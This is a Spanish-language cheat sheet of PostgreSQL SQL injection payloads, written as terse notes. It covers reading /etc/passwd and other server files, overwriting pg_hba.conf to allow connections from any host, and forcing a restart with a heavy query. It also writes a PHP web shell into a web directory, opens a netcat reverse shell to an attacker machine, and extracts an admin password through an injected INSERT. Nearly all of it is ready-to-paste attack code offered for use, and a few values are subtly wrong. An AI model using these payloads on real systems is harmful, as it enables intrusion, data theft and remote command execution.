Lectura de ficheros

ruta donde se encuantran
id=-1 union select name ||'='|| setting,null,null,null from pg_settings where name='data_directory'

para crear la tabla y rellenar
id=1; create table fichero(linea text); copy fichero from '/var/lib/postgresql/10/main/server.crt'

numero de filas de la tabla
id=-1 union select null,null,count(*),null from fichero

seleccionar las filas
id=-1 union select
(select linea from fichero limit 1 offset 0)||'<br>'||
(select linea from fichero limit 1 offset 1)||'<br>'||
(select linea from fichero limit 1 offset 2)||'<br>'||
(select linea from fichero limit 1 offset 3)||'<br>'||
(select linea from fichero limit 1 offset 4)||'<br>'||
(select linea from fichero limit 1 offset 5)||'<br>'||
(select linea from fichero limit 1 offset 6),
null,null,null

Otra forma de extraer archivos

importar el fichero
id=-1 union select null,null,cast(lo_import('/etc/passwd') as int), null
el archivo se almacena en la tabla pg_largeobject

numero de filas
id=-1 union select null,null,count(*),null from pg_largeobject where loid=49172

extraer filas
id=-1 union select cast(data as text),null,null,null from pg_largeobject where loid=49172

ESCRIBIR FICHEROS

Primero hay que configurar postgresql para que permita ataques desde maquinas remotas
consultando pg_settings y determinando la ruta y contenido de pg_hba.conf
local all postgres     ident
local all all          ident
host  all 120.0.0.1/32 ident
Solo hay permiso para localhost
Queremos establecer el permiso 0.0.0.0/0 (any)

id=1;
create table evilhba(n int,c1 text,c2 text,c3 text,c4 text,c5 text);
insert into evilhba values
	(1,'local','all','postgres','','ident'),
	(2,'local','all','all','','ident'),
	(3,'host','all','all','0.0.0.0/0','ms5');
copy (select c1,c2,c3,c4,c5 from evilhba order by n)
	to'etc/postgresql/8.4/main/pg_hba.conf';
drop table evilhba

id=1;create table evilhba(n int,c1 text,c2 text,c3 text,c4 text,c5 text);insert into evilhba values(1,'local','all','postgres','','ident'),(2,'local','all','all','','ident'),(3,'host','all','all','0.0.0.0/0','ms5');copy (select c1,c2,c3,c4,c5 from evilhba order by n) to 'etc/postgresql/10/main/pg_hba.conf';drop table evilhba

Enviar peticiones para que se reinicie el servidor
id=-1 union select null,null,avg(i),null from (select generate_series(1,65325000000000000) i) j

Ejecutar un CMD
crear un archivo PHP cmd.php
<pre><?php system($_GET['cmd']) ?></pre>

Consulta para crearlo
id=1;
create table evilhba(t text);
insert into evilhba values('<pre><?php system($_GET['cmd'])?></pre>');
copy evilhba to '/var/www/roundcubemail/temp/cmd.php';
drop table evilhba

id=1;create table evilhba(t text);insert into evilhba values('<pre><?php system($_GET[\'cmd\'])?></pre>');copy evilhba to '/root/prueba/cmd.php';drop table evilhba

invocar el script con peticiones http
http://.../cmd.php?cmd=cat /etc/passwd

NOTA: los comandos se ejecutan con los permisos del usuario del servidor WEB no de postgresql

Para abrir una shell remota en ubuntu

en la maquina del atacante dejar escuchando dos puertos
nc -l 8000 | nc -l 80001

crear la conexion
cmd=while :; do :; done | nc maquina.atacante 8000 | /bin/sh | nc maquina.atacante 8001

Para importar funciones en C en postgresql deployar en postgre 8.1
Nota: si ejecutamos comandos de esta forma, utilizamos los permisos del usuario postgres

**libreria de c para postgre: https://svn.sqlmap.org/trunk/sqlmap/ extra/udfhack lib_postgresqludf_sys

Para crear archivos binarios
id=-1 union select cast(lo_create(-2) as text),null,null,null
*Retorna el OID

Modificar el contenido
id=-1;update pg_largeobject set data = E'Prueba:\012\011Texto tabulado'::bytea where loid = 4294967294

Otra forma
id=-1;insert into pg_largeobject values(4294967294, 1, decode('Ck90cmEgbGluZWE=','base64'))
*Retorno de carro seguido de la cadena 'Otra linea'
*El 1 indica el numero de pagina del objeto

Creadas las paginas, hay que crear el fichero en una ruta accesible
id=-1;select lo_export(4294967294,'/tmp/fichero')

paquetes para lenguages en postgre
plperlu: postgresql-plperl
plpythonu: postgresql-plpython
pltclu: postgresql-pltcl

Para conocer lenguajes activados
tabla pg_language

para agregar nuevos lenguajes
create language plpythonu

para comprobar si esta instalado
select lanname,null,null,null from pg_language where lanname='plpythonu'

Si algun lenguaje esta activo se pueden definir funciones en esos lenguajes
create function ejecutar(text) returns text AS $$ [funcion] $$ language plpythonu

*Comando en python os.popen(args[0])

Si el login no nos da informacion
'; insert into almacen.usuarios(id,nombre, contrasena,"desc") values(33,'a','b',(select nombre||':'||conrasena from almacen.usuarios where nombre='admin'))-- 






